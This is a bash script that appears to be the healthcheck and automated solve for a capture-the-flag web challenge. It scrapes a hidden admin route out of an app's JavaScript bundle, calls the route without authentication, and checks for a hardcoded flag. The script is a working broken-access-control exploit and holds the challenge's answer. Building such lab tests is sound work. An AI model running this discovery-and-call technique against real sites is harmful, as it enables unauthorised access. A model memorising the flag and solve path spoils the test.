#!/usr/bin/env bash
# e02 healthcheck / scripted solve: read the SPA bundle, extract the hidden admin
# route, call it (no auth), confirm the flag comes back. Runs against a URL
# ($TARGET) or builds+runs the container locally.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLAG="${CHAL_FLAG-}"; [ -n "$FLAG" ] || FLAG='CYPHER{client_side_is_not_auth}'
TARGET="${TARGET-}"; CID=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1 || true' EXIT

if [ -z "$TARGET" ]; then
  docker build -q -t cypher-e02 "$HERE" >/dev/null
  CID="$(docker run -d -e FLAG="$FLAG" -P cypher-e02)"
  PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
  TARGET="http://127.0.0.1:$PORT"
fi
for i in $(seq 1 30); do curl -fsS "$TARGET/" >/dev/null 2>&1 && break; sleep 0.5; done

# 1) pull the bundle; the admin path is built as API_BASE + "/admin/broadcast"
JS="$(curl -fsS "$TARGET/static/app.9f3c1a2b.js")"
BASE="$(printf '%s' "$JS" | grep -oE 'API_BASE="[^"]*"' | head -1 | sed -E 's/API_BASE="([^"]*)"/\1/')"
FRAG="$(printf '%s' "$JS" | grep -oE '"/[a-zA-Z0-9/_-]*admin[a-zA-Z0-9/_-]*"' | head -1 | tr -d '"')"
ROUTE="${BASE}${FRAG}"
echo "discovered route: $ROUTE"
# 2) call it directly
BODY="$(curl -fsS "$TARGET$ROUTE")"
echo "response: $BODY"
case "$BODY" in *"$FLAG"*) echo "e02 healthcheck rc=0"; exit 0 ;; esac
echo "e02 healthcheck FAILED"; exit 1
